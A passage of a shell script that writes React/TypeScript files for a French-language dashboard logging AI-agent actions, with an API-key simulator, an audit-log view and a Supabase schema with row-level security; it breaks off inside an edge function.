            </div>
          </div>

          {loading ? (
            <div className="p-12 text-center text-slate-400 text-xs">Chargement des clés API...</div>
          ) : keys.length === 0 ? (
            <div className="p-12 text-center text-slate-400 text-xs">
              Aucune clé créée pour l&apos;instant. Utilisez le formulaire à gauche pour en générer une.
            </div>
          ) : (
            <div className="divide-y divide-[#1E293B]">
              {keys.map((k) => (
                <div key={k.id} className="p-4 sm:p-5 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 hover:bg-slate-800/30 transition-colors">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2.5">
                      <span className="font-bold text-sm text-white">{k.label || "Sans label"}</span>
                      <span className="bg-[#0B1220] border border-slate-700 text-teal-400 font-mono text-[11px] px-2 py-0.5 rounded">
                        {k.keyPrefix || "dlg_live_****"}
                      </span>
                    </div>
                    <div className="flex flex-wrap items-center gap-4 text-[11px] text-slate-400">
                      <span>Créée le : {new Date(k.createdAt).toLocaleDateString("fr-FR")}</span>
                      <span>•</span>
                      <span className="flex items-center gap-1">
                        <Clock className="w-3 h-3 text-slate-500" />
                        Dernière utilisation :{" "}
                        {k.lastUsedAt ? (
                          <span className="text-teal-300 font-semibold">{new Date(k.lastUsedAt).toLocaleString("fr-FR")}</span>
                        ) : (
                          <span className="text-slate-500 italic">Jamais utilisée</span>
                        )}
                      </span>
                    </div>
                  </div>

                  <div className="flex items-center gap-2 self-end sm:self-auto">
                    <button
                      onClick={() => handleCopySecret("dlg_live_demo_key_99887766554433221100")}
                      className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold border border-slate-700 flex items-center gap-1.5 transition-colors"
                      title="Copier la clé de démo pour tester le CLI"
                    >
                      <Copy className="w-3.5 h-3.5 text-teal-400" />
                      <span>Clé Démo</span>
                    </button>
                    <button
                      onClick={() => handleRevoke(k.id)}
                      className="p-2 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 hover:text-red-300 border border-red-500/30 transition-colors"
                      title="Révoquer cette clé API"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Built-in Interactive CLI Simulator */}
      <div className="bg-[#111C33] border border-teal-500/30 rounded-lg p-6 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 bg-teal-500/10 text-teal-300 text-[10px] font-semibold uppercase px-3 py-1 rounded-bl-xl border-b border-l border-teal-500/30">
          CLI Live Sandbox
        </div>

        <div className="mb-6 max-w-2xl">
          <div className="flex items-center gap-2 text-teal-400 font-bold text-base mb-1">
            <Terminal className="w-5 h-5" />
            <span>Simulateur d&apos;authentification Machine (POST /sync-audit)</span>
          </div>
          <p className="text-xs text-slate-300">
            Testez en direct l&apos;envoi d&apos;une entrée d&apos;audit depuis l&apos;équivalent d&apos;un agent Python ou Node.js vers notre Edge Function. L&apos;API vérifiera le hash de votre clé dans <code className="text-teal-300">api_keys</code> avant d&apos;insérer dans <code className="text-teal-300">audit_entries</code>.
          </p>
        </div>

        <form onSubmit={handleSimulateSync} className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="md:col-span-2">
            <label className="block text-xs font-semibold text-slate-300 mb-1">
              En-tête d&apos;autorisation (Clé API brute testée)
            </label>
            <input
              type="text"
              value={simKeyInput}
              onChange={(e) => setSimKeyInput(e.target.value)}
              placeholder="dlg_live_..."
              required
              className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2 px-3 text-xs text-teal-300 font-mono focus:outline-none focus:border-teal-500"
            />
            <span className="text-[10px] text-slate-500 mt-1 block">
              Astuce : Utilisez votre nouvelle clé générée ci-dessus ou la clé démo <code className="text-slate-400">dlg_live_demo_key_99887766554433221100</code>.
            </span>
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1">Émetteur / Framework Agent</label>
            <input
              type="text"
              value={simIssuer}
              onChange={(e) => setSimIssuer(e.target.value)}
              className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2 px-3 text-xs text-white focus:outline-none focus:border-teal-500"
            />
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1">Sujet / ID Agent</label>
            <select
              value={simSubject}
              onChange={(e) => setSimSubject(e.target.value)}
              className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2 px-3 text-xs text-white focus:outline-none focus:border-teal-500 font-medium"
            >
              <option value="agent-code-interpreter">agent-code-interpreter (Sandbox Python/Bash)</option>
              <option value="agent-db-migrator">agent-db-migrator (Postgres Mutation Check)</option>
              <option value="agent-payout-controller">agent-payout-controller (Stripe API Check)</option>
              <option value="agent-customer-support">agent-customer-support (LLM Frontline)</option>
            </select>
          </div>

          <div className="md:col-span-2">
            <label className="block text-xs font-semibold text-slate-300 mb-1">Action Interceptée</label>
            <input
              type="text"
              value={simAction}
              onChange={(e) => setSimAction(e.target.value)}
              className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2 px-3 text-xs text-white font-mono focus:outline-none focus:border-teal-500"
            />
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1">Décision Delgard SDK</label>
            <select
              value={simDecision}
              onChange={(e) => setSimDecision(e.target.value)}
              className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2 px-3 text-xs font-bold text-white focus:outline-none focus:border-teal-500"
            >
              <option value="allow" className="text-teal-400">ALLOW (Action autorisée)</option>
              <option value="block" className="text-red-400">BLOCK (Action bloquée par règle)</option>
              <option value="approval-required" className="text-amber-400">APPROVAL REQUIRED (Approbation humaine)</option>
            </select>
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1">Raison de la politique</label>
            <input
              type="text"
              value={simReason}
              onChange={(e) => setSimReason(e.target.value)}
              className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2 px-3 text-xs text-white focus:outline-none focus:border-teal-500"
            />
          </div>

          <div className="md:col-span-2 pt-2">
            <button
              type="submit"
              disabled={simulating}
              className="w-full py-3 rounded-md bg-gradient-to-r from-teal-500 via-emerald-600 to-teal-500 hover:brightness-110 text-[#0B1220] font-semibold text-xs shadow-none transition-all flex items-center justify-center gap-2 disabled:opacity-50"
            >
              <Play className="w-4 h-4 fill-current" />
              <span>{simulating ? "Envoi et vérification de la clé en cours..." : "Exécuter l'appel CLI /sync-audit & Inscrire le log"}</span>
            </button>
          </div>
        </form>

        {simStatus && (
          <div
            className={clsx(
              "mt-5 p-4 rounded-md text-xs border animate-in fade-in duration-200",
              simStatus.type === "success"
                ? "bg-emerald-500/10 text-emerald-300 border-emerald-500/30"
                : "bg-red-500/10 text-red-300 border-red-500/30"
            )}
          >
            <div className="flex items-start gap-2 font-bold mb-1">
              <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
              <span>{simStatus.text}</span>
            </div>
            {simStatus.details && (
              <div className="mt-2 bg-[#0B1220] p-3 rounded-lg border border-emerald-500/20 font-mono text-[11px] text-teal-300">
                {JSON.stringify(simStatus.details, null, 2)}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/components"
cat > "src/components/AuditLogView.tsx" << 'DELGARD_FILE_EOF_9f3a2b'
"use client";

import React, { useState, useEffect } from "react";
import {
  Search,
  Filter,
  CheckCircle2,
  XCircle,
  AlertTriangle,
  Clock,
  Code2,
  Lock,
  Zap,
  ChevronRight,
  ShieldAlert,
  Hash,
  Terminal,
  RefreshCw,
} from "lucide-react";
import clsx from "clsx";

interface AuditLogViewProps {
  plan: string;
  onTogglePlan: (newPlan: string) => void;
  onNavigateToKeys: () => void;
}

export function AuditLogView({ plan, onTogglePlan, onNavigateToKeys }: AuditLogViewProps) {
  const [entries, setEntries] = useState<any[]>([]);
  const [totalCount, setTotalCount] = useState(0);
  const [hasOlderTruncated, setHasOlderTruncated] = useState(false);
  const [truncatedCount, setTruncatedCount] = useState(0);
  const [uniqueSubjects, setUniqueSubjects] = useState<string[]>([]);
  const [loading, setLoading] = useState(true);

  // Filters
  const [decisionFilter, setDecisionFilter] = useState("all");
  const [subjectFilter, setSubjectFilter] = useState("all");
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedEntry, setSelectedEntry] = useState<any | null>(null);

  const fetchAuditLogs = async () => {
    setLoading(true);
    try {
      const params = new URLSearchParams({
        decision: decisionFilter,
        subject: subjectFilter,
        search: searchQuery,
      });
      const res = await fetch(`/api/audit?${params.toString()}`);
      const data = await res.json();
      if (data.ok) {
        setEntries(data.entries || []);
        setTotalCount(data.totalCount || 0);
        setHasOlderTruncated(data.hasOlderTruncated || false);
        setTruncatedCount(data.truncatedCount || 0);
        setUniqueSubjects(data.uniqueSubjects || []);
      }
    } catch (err) {
      console.error("Failed to load audit logs:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchAuditLogs();
  }, [decisionFilter, subjectFilter, searchQuery, plan]);

  // Compute stats from entries
  const allowCount = entries.filter((e) => e.decision === "allow").length;
  const blockCount = entries.filter((e) => e.decision === "block").length;
  const approvalCount = entries.filter((e) => e.decision === "approval-required").length;

  return (
    <div className="space-y-6 animate-in fade-in duration-300">
      {/* Top Banner explaining the view */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 bg-[#111C33] border border-[#1E293B] rounded-lg p-5 shadow-lg">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <h1 className="text-xl font-semibold text-white">Journal d&apos;Audit en Ligne</h1>
            <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-teal-500/10 text-teal-400 border border-teal-500/30">
              Chaine de confiance immuable
            </span>
          </div>
          <p className="text-xs text-slate-400 max-w-2xl">
            Surveillez et inspectez en temps réel toutes les actions inter-agents interceptées par les SDK et CLI <code className="bg-slate-800 text-teal-300 px-1.5 py-0.5 rounded">delgard</code>. Chaque entrée est signée cryptographiquement avec un hash lié à l&apos;action précédente (<code className="text-slate-300">prev_hash</code>).
          </p>
        </div>

        <div className="flex items-center gap-3">
          <button
            onClick={fetchAuditLogs}
            disabled={loading}
            className="px-3.5 py-2 rounded-md bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold text-xs flex items-center gap-2 border border-slate-700 transition-all disabled:opacity-50"
          >
            <RefreshCw className={clsx("w-3.5 h-3.5", loading && "animate-spin")} />
            <span>Actualiser</span>
          </button>
          <button
            onClick={onNavigateToKeys}
            className="px-4 py-2 rounded-md bg-[color:var(--accent)] hover:bg-[#26bfab] text-[#0B1220] font-semibold text-xs shadow-none transition-all flex items-center gap-2"
          >
            <Terminal className="w-3.5 h-3.5 fill-current" />
            <span>Simuler un flux d&apos;agent</span>
          </button>
        </div>
      </div>

      {/* Free Plan Truncation Notice Banner */}
      {plan === "free" && (
        <div className="bg-gradient-to-r from-amber-500/10 via-amber-500/5 to-transparent border border-amber-500/30 rounded-lg p-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
          <div className="flex items-start gap-3">
            <Lock className="w-5 h-5 text-amber-400 flex-shrink-0 mt-0.5" />
            <div>
              <h4 className="text-sm font-bold text-amber-300">
                Plan Gratuit : Historique limité aux 7 derniers jours (ou 1000 entrées)
              </h4>
              <p className="text-xs text-slate-300 mt-0.5">
                {hasOlderTruncated ? (
                  <>
                    <span className="font-semibold text-amber-200">{truncatedCount} entrée(s) plus ancienne(s)</span> ont été masquées conformément aux limites du plan Gratuit.
                  </>
                ) : (
                  <>
                    Toutes vos entrées récentes sont affichées ci-dessous. Les entrées datant de plus de 7 jours sont masquées en formule Gratuite.
                  </>
                )}
              </p>
            </div>
          </div>
          <button
            onClick={() => onTogglePlan("pro")}
            className="px-4 py-2 rounded-md bg-[color:var(--accent)] text-[#0B1220] font-semibold text-xs whitespace-nowrap shadow-none transition-transform flex items-center gap-1.5 self-stretch sm:self-auto justify-center"
          >
            <Zap className="w-3.5 h-3.5 fill-current" />
            <span>Passez Pro (Débloquer l&apos;historique illimité)</span>
          </button>
        </div>
      )}

      {/* Metric Pills */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3.5">
        <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-4">
          <span className="text-xs font-semibold text-slate-400 block mb-1">Entrées Affichées</span>
          <div className="flex items-baseline justify-between">
            <span className="text-2xl font-semibold text-white">{entries.length}</span>
            <span className="text-[10px] text-slate-500 font-bold uppercase">sur {totalCount} au total</span>
          </div>
        </div>

        <div
          onClick={() => setDecisionFilter("allow")}
          className={clsx(
            "bg-[#111C33] border rounded-lg p-4 cursor-pointer transition-all",
            decisionFilter === "allow" ? "border-teal-500 bg-teal-500/5 shadow-none" : "border-[#1E293B] hover:border-teal-500/40"
          )}
        >
          <div className="flex items-center justify-between mb-1">
            <span className="text-xs font-semibold text-teal-400">Actions Autorisées</span>
            <CheckCircle2 className="w-4 h-4 text-teal-400" />
          </div>
          <span className="text-2xl font-semibold text-white">{allowCount}</span>
        </div>

        <div
          onClick={() => setDecisionFilter("block")}
          className={clsx(
            "bg-[#111C33] border rounded-lg p-4 cursor-pointer transition-all",
            decisionFilter === "block" ? "border-red-500 bg-red-500/5 shadow-md shadow-red-500/10" : "border-[#1E293B] hover:border-red-500/40"
          )}
        >
          <div className="flex items-center justify-between mb-1">
            <span className="text-xs font-semibold text-red-400">Actions Bloquées</span>
            <XCircle className="w-4 h-4 text-red-400" />
          </div>
          <span className="text-2xl font-semibold text-white">{blockCount}</span>
        </div>

        <div
          onClick={() => setDecisionFilter("approval-required")}
          className={clsx(
            "bg-[#111C33] border rounded-lg p-4 cursor-pointer transition-all",
            decisionFilter === "approval-required" ? "border-amber-500 bg-amber-500/5 shadow-md shadow-amber-500/10" : "border-[#1E293B] hover:border-amber-500/40"
          )}
        >
          <div className="flex items-center justify-between mb-1">
            <span className="text-xs font-semibold text-amber-400">En attente d&apos;Approbation</span>
            <AlertTriangle className="w-4 h-4 text-amber-400" />
          </div>
          <span className="text-2xl font-semibold text-white">{approvalCount}</span>
        </div>
      </div>

      {/* Filter and Search Bar */}
      <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-4 flex flex-col md:flex-row items-stretch md:items-center justify-between gap-3">
        {/* Search Input */}
        <div className="relative flex-1">
          <Search className="absolute left-3.5 top-3 w-4 h-4 text-slate-500" />
          <input
            type="text"
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Rechercher par action, sujet, émetteur, raison (ex: exec:bash, stripe, drop_table)..."
            className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2 pl-10 pr-4 text-xs text-white focus:outline-none focus:border-teal-500 placeholder:text-slate-500 transition-colors"
          />
        </div>

        {/* Decision Tabs */}
        <div className="flex items-center gap-1.5 bg-[#0B1220] p-1 rounded-md border border-slate-800">
          {[
            { id: "all", label: "Tous" },
            { id: "allow", label: "Autorisés" },
            { id: "block", label: "Bloqués" },
            { id: "approval-required", label: "Approbation req." },
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setDecisionFilter(tab.id)}
              className={clsx(
                "px-3 py-1.5 rounded-lg text-xs font-bold transition-all whitespace-nowrap",
                decisionFilter === tab.id
                  ? "bg-teal-500/20 text-teal-300 border border-teal-500/40"
                  : "text-slate-400 hover:text-white hover:bg-slate-800/40"
              )}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {/* Subject Filter Dropdown */}
        <div className="flex items-center gap-2">
          <Filter className="w-3.5 h-3.5 text-slate-500 hidden sm:block" />
          <select
            value={subjectFilter}
            onChange={(e) => setSubjectFilter(e.target.value)}
            className="bg-[#0B1220] border border-slate-700/80 rounded-md px-3 py-2 text-xs text-white focus:outline-none focus:border-teal-500 transition-colors font-medium"
          >
            <option value="all">Tous les sujets (agents)</option>
            {uniqueSubjects.map((subject) => (
              <option key={subject} value={subject}>
                {subject}
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Audit Log Table / Timeline */}
      <div className="bg-[#111C33] border border-[#1E293B] rounded-lg overflow-hidden shadow-xl">
        {loading ? (
          <div className="p-12 text-center text-slate-400 text-sm flex flex-col items-center justify-center gap-3">
            <RefreshCw className="w-6 h-6 animate-spin text-teal-400" />
            <span>Chargement et vérification cryptographique des logs d&apos;audit...</span>
          </div>
        ) : entries.length === 0 ? (
          <div className="p-12 text-center text-slate-400 text-sm">
            <ShieldAlert className="w-10 h-10 text-slate-600 mx-auto mb-3" />
            <p className="font-bold text-white mb-1">Aucune entrée trouvée avec ces filtres</p>
            <p className="text-xs text-slate-500">
              Essayez de modifier votre recherche ou de cliquer sur &quot;Simuler un flux d&apos;agent&quot; pour injecter des logs en direct.
            </p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="border-b border-[#1E293B] bg-[#0B1220]/60 text-slate-400 text-[11px] font-semibold uppercase tracking-wider">
                  <th className="py-3.5 px-4">Décision</th>
                  <th className="py-3.5 px-4">Agent (Subject)</th>
                  <th className="py-3.5 px-4">Action interceptée</th>
                  <th className="py-3.5 px-4">Émetteur / Framework</th>
                  <th className="py-3.5 px-4">Raison & Politique</th>
                  <th className="py-3.5 px-4 text-right">Horodatage</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#1E293B] text-xs">
                {entries.map((entry) => {
                  const isAllow = entry.decision === "allow";
                  const isBlock = entry.decision === "block";
                  const isApproval = entry.decision === "approval-required";

                  return (
                    <tr
                      key={entry.id || entry.entryHash}
                      onClick={() => setSelectedEntry(entry)}
                      className="hover:bg-slate-800/40 cursor-pointer transition-colors group"
                    >
                      {/* Decision Badge — carries the hash-chain signature motif */}
                      <td className="py-3.5 pl-5 pr-4 whitespace-nowrap chain-link">
                        <span
                          className={clsx(
                            "inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-semibold border tracking-wide",
                            isAllow && "bg-teal-500/10 text-teal-400 border-teal-500/30",
                            isBlock && "bg-red-500/10 text-red-400 border-red-500/30",
                            isApproval && "bg-amber-500/10 text-amber-400 border-amber-500/30"
                          )}
                        >
                          {isAllow && <CheckCircle2 className="w-3.5 h-3.5" />}
                          {isBlock && <XCircle className="w-3.5 h-3.5" />}
                          {isApproval && <AlertTriangle className="w-3.5 h-3.5" />}
                          {isAllow ? "ALLOW" : isBlock ? "BLOCK" : "APPROVAL"}
                        </span>
                      </td>

                      {/* Subject */}
                      <td className="py-3.5 px-4 font-bold text-slate-200">
                        <div className="flex items-center gap-1.5">
                          <Code2 className="w-3.5 h-3.5 text-teal-400" />
                          <span>{entry.subject || "agent-unknown"}</span>
                        </div>
                      </td>

                      {/* Action */}
                      <td className="py-3.5 px-4">
                        <code className="bg-[#0B1220] border border-slate-700/60 px-2 py-1 rounded text-[11px] text-teal-300 font-mono block max-w-xs md:max-w-md truncate">
                          {entry.action}
                        </code>
                      </td>

                      {/* Issuer */}
                      <td className="py-3.5 px-4 text-slate-400 font-medium whitespace-nowrap">
                        {entry.issuer || "Delgard-CLI"}
                      </td>

                      {/* Reason */}
                      <td className="py-3.5 px-4 text-slate-300 max-w-sm truncate">
                        {entry.reason || <span className="text-slate-600 italic">Aucune raison spécifiée</span>}
                      </td>

                      {/* Timestamp */}
                      <td className="py-3.5 px-4 text-right text-slate-400 font-mono text-[11px] whitespace-nowrap flex items-center justify-end gap-1.5 group-hover:text-teal-400 transition-colors">
                        <Clock className="w-3 h-3 text-slate-500" />
                        <span>
                          {entry.occurredAt
                            ? new Date(entry.occurredAt).toLocaleString("fr-FR", {
                                month: "short",
                                day: "numeric",
                                hour: "2-digit",
                                minute: "2-digit",
                                second: "2-digit",
                              })
                            : "À l'instant"}
                        </span>
                        <ChevronRight className="w-4 h-4 opacity-0 group-hover:opacity-100 transition-opacity" />
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Detail Modal / Drawer when clicking an audit entry */}
      {selectedEntry && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-[#0B1220]/80 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="relative w-full max-w-2xl bg-[#111C33] border border-[#1E293B] rounded-lg shadow-2xl overflow-hidden p-6 text-slate-200 max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between border-b border-[#1E293B] pb-4 mb-5">
              <div className="flex items-center gap-3">
                <div
                  className={clsx(
                    "w-10 h-10 rounded-md flex items-center justify-center font-bold",
                    selectedEntry.decision === "allow" && "bg-teal-500/20 text-teal-400 border border-teal-500/40",
                    selectedEntry.decision === "block" && "bg-red-500/20 text-red-400 border border-red-500/40",
                    selectedEntry.decision === "approval-required" && "bg-amber-500/20 text-amber-400 border border-amber-500/40"
                  )}
                >
                  <Hash className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-base font-semibold text-white">Détail Cryptographique de l&apos;Entrée</h3>
                  <p className="text-xs text-slate-400">ID d&apos;Audit : {selectedEntry.id || "en mémoire"}</p>
                </div>
              </div>
              <button
                onClick={() => setSelectedEntry(null)}
                className="text-slate-400 hover:text-white bg-slate-800/60 p-1.5 rounded-lg"
              >
                ✕
              </button>
            </div>

            <div className="space-y-4 text-xs">
              <div className="grid grid-cols-2 gap-3 bg-[#0B1220] p-3.5 rounded-md border border-slate-800">
                <div>
                  <span className="text-slate-500 block mb-1 uppercase font-bold text-[10px]">Décision</span>
                  <span className="font-semibold text-sm uppercase text-white">{selectedEntry.decision}</span>
                </div>
                <div>
                  <span className="text-slate-500 block mb-1 uppercase font-bold text-[10px]">Sujet (Agent)</span>
                  <span className="font-bold text-teal-400">{selectedEntry.subject}</span>
                </div>
                <div>
                  <span className="text-slate-500 block mb-1 uppercase font-bold text-[10px]">Émetteur</span>
                  <span className="font-semibold text-slate-300">{selectedEntry.issuer || "N/A"}</span>
                </div>
                <div>
                  <span className="text-slate-500 block mb-1 uppercase font-bold text-[10px]">Date d&apos;Exécution</span>
                  <span className="text-slate-300">
                    {selectedEntry.occurredAt ? new Date(selectedEntry.occurredAt).toLocaleString("fr-FR") : "N/A"}
                  </span>
                </div>
              </div>

              <div>
                <span className="text-slate-400 block mb-1 font-semibold">Action Interceptée (Commande / Appel API)</span>
                <div className="bg-[#0B1220] border border-teal-500/30 p-3 rounded-md font-mono text-teal-300 text-xs overflow-x-auto">
                  {selectedEntry.action}
                </div>
              </div>

              {selectedEntry.reason && (
                <div>
                  <span className="text-slate-400 block mb-1 font-semibold">Raison de la politique / Règle d&apos;évaluation</span>
                  <div className="bg-slate-800/50 border border-slate-700/60 p-3 rounded-md text-slate-200 text-xs">
                    {selectedEntry.reason}
                  </div>
                </div>
              )}

              {/* Cryptographic Chain Inspect */}
              <div className="border-t border-slate-800 pt-4">
                <h4 className="font-bold text-slate-300 mb-2 flex items-center gap-1.5">
                  <ShieldAlert className="w-4 h-4 text-teal-400" />
                  <span>Chaine de hachage anti-falsification</span>
                </h4>
                <div className="space-y-2 font-mono text-[11px]">
                  <div className="bg-[#0B1220] p-2.5 rounded-lg border border-slate-800 break-all">
                    <span className="text-slate-500 block font-sans text-[10px] mb-0.5">Hash de cette entrée (SHA-256)</span>
                    <span className="text-emerald-400">{selectedEntry.entryHash || "sha256_e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}</span>
                  </div>
                  <div className="bg-[#0B1220] p-2.5 rounded-lg border border-slate-800 break-all">
                    <span className="text-slate-500 block font-sans text-[10px] mb-0.5">Hash de l&apos;entrée précédente (prev_hash)</span>
                    <span className="text-slate-400">{selectedEntry.prevHash || "Racine du journal (Genesis Log)"}</span>
                  </div>
                </div>
              </div>

              <div className="pt-3 flex justify-end">
                <button
                  onClick={() => setSelectedEntry(null)}
                  className="px-5 py-2 rounded-md bg-slate-800 hover:bg-slate-700 text-white font-bold text-xs transition-colors"
                >
                  Fermer
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/components"
cat > "src/components/DeploymentKitView.tsx" << 'DELGARD_FILE_EOF_9f3a2b'
"use client";

import React, { useState } from "react";
import {
  BookOpenCheck,
  Code2,
  Database,
  Terminal,
  Copy,
  Check,
  Globe,
} from "lucide-react";
import clsx from "clsx";

export function DeploymentKitView() {
  const [activeCodeTab, setActiveCodeTab] = useState<"sql" | "edge" | "frontend" | "guide">("guide");
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  const handleCopy = (code: string, label: string) => {
    navigator.clipboard.writeText(code);
    setCopiedCode(label);
    setTimeout(() => setCopiedCode(null), 2500);
  };

  const COMPLETE_SQL_SCHEMA = `-- =========================================================================
-- DELGARD CLOUD DASHBOARD - SUPABASE POSTGRESQL SCHEMA WITH RLS
-- À exécuter directement dans le SQL Editor de l'interface Supabase Web
-- =========================================================================

-- 1. Tables de base
create table if not exists profiles (
  id uuid references auth.users primary key,
  plan text not null default 'free' check (plan in ('free','pro')),
  created_at timestamptz default now()
);

create table if not exists api_keys (
  id uuid primary key default gen_random_uuid(),
  user_id uuid references auth.users not null,
  key_hash text not null,
  label text,
  created_at timestamptz default now(),
  last_used_at timestamptz
);

create table if not exists audit_entries (
  id uuid primary key default gen_random_uuid(),
  user_id uuid references auth.users not null,
  entry_hash text not null,
  prev_hash text,
  issuer text,
  subject text,
  action text,
  decision text,
  reason text,
  occurred_at timestamptz not null,
  received_at timestamptz default now()
);

create table if not exists teams (
  id uuid primary key default gen_random_uuid(),
  name text not null,
  owner_id uuid references auth.users not null,
  created_at timestamptz default now()
);

create table if not exists team_members (
  team_id uuid references teams not null on delete cascade,
  user_id uuid references auth.users not null on delete cascade,
  role text default 'member',
  primary key (team_id, user_id)
);

create table if not exists shared_policies (
  id uuid primary key default gen_random_uuid(),
  team_id uuid references teams not null on delete cascade,
  yaml_content text not null,
  updated_at timestamptz default now(),
  updated_by uuid references auth.users
);

create table if not exists alert_configs (
  id uuid primary key default gen_random_uuid(),
  user_id uuid references auth.users on delete cascade,
  team_id uuid references teams on delete cascade,
  channel text check (channel in ('email','slack')),
  target text not null,
  trigger_on text[] default array['block','approval-required'],
  created_at timestamptz default now()
);

-- =========================================================================
-- 2. ACTIVATION DE ROW LEVEL SECURITY (RLS) SUR TOUTES LES TABLES
-- =========================================================================

alter table profiles enable row level security;
alter table api_keys enable row level security;
alter table audit_entries enable row level security;
alter table teams enable row level security;
alter table team_members enable row level security;
alter table shared_policies enable row level security;
alter table alert_configs enable row level security;

-- =========================================================================
-- 3. POLICIES RLS EXPLICITES (Isolation stricte par utilisateur & équipe)
-- =========================================================================

-- Profiles: Chaque utilisateur ne voit et ne modifie que son propre profil
create policy "Users can view own profile"
  on profiles for select
  using (auth.uid() = id);

create policy "Users can update own profile"
  on profiles for update
  using (auth.uid() = id);

create policy "Users can insert own profile"
  on profiles for insert
  with check (auth.uid() = id);

-- API Keys: Chaque utilisateur ne gère que ses propres clés
create policy "Users can view own api_keys"
  on api_keys for select
  using (auth.uid() = user_id);

create policy "Users can create own api_keys"
  on api_keys for insert
  with check (auth.uid() = user_id);

create policy "Users can delete own api_keys"
  on api_keys for delete
  using (auth.uid() = user_id);

-- Audit Entries: Chaque utilisateur ne voit que ses propres logs
create policy "Users can view own audit_entries"
  on audit_entries for select
  using (auth.uid() = user_id);

create policy "Users can insert own audit_entries"
  on audit_entries for insert
  with check (auth.uid() = user_id);

-- Teams: Seuls les membres d'une équipe peuvent voir l'équipe
create policy "Team members can view team"
  on teams for select
  using (
    owner_id = auth.uid() or
    exists (select 1 from team_members where team_id = teams.id and user_id = auth.uid())
  );

create policy "Owners can update team"
  on teams for update
  using (owner_id = auth.uid());

-- Team Members: Les membres d'une équipe voient les autres membres
create policy "Members can view team_members"
  on team_members for select
  using (
    user_id = auth.uid() or
    exists (select 1 from team_members tm where tm.team_id = team_members.team_id and tm.user_id = auth.uid())
  );

create policy "Owners and Admins can manage team_members"
  on team_members for all
  using (
    exists (
      select 1 from team_members tm
      where tm.team_id = team_members.team_id and tm.user_id = auth.uid() and tm.role in ('owner','admin')
    )
  );

-- Shared Policies: Lecture et modification réservées aux membres de l'équipe
create policy "Team members can view shared_policies"
  on shared_policies for select
  using (
    exists (select 1 from team_members where team_id = shared_policies.team_id and user_id = auth.uid())
  );

create policy "Team members can insert/update shared_policies"
  on shared_policies for all
  using (
    exists (select 1 from team_members where team_id = shared_policies.team_id and user_id = auth.uid())
  );

-- Alert Configs: Isolation par utilisateur ou par équipe
create policy "Users can manage own or team alerts"
  on alert_configs for all
  using (
    user_id = auth.uid() or
    (team_id is not null and exists (select 1 from team_members where team_id = alert_configs.team_id and user_id = auth.uid()))
  );

-- =========================================================================
-- 4. TRIGGER DE CRÉATION AUTOMATIQUE DU PROFIL LORS DU SIGNUP
-- =========================================================================
create or replace function public.handle_new_user()
returns trigger as $$
begin
  insert into public.profiles (id, plan)
  values (new.id, 'free');
  return new;
end;
$$ language plpgsql security definer;

drop trigger if exists on_auth_user_created on auth.users;
create trigger on_auth_user_created
  after insert on auth.users
  for each row execute procedure public.handle_new_user();
`;

  const COMPLETE_EDGE_FUNCTION = `// =========================================================================
// SUPABASE EDGE FUNCTION : POST /sync-audit
// Fichier : supabase/functions/sync-audit/index.ts
// =========================================================================

import { createClient } from "https://esm.sh/@supabase/supabase-js@2.39.8";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

async function hashApiKey(key: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(key);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
}

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") {
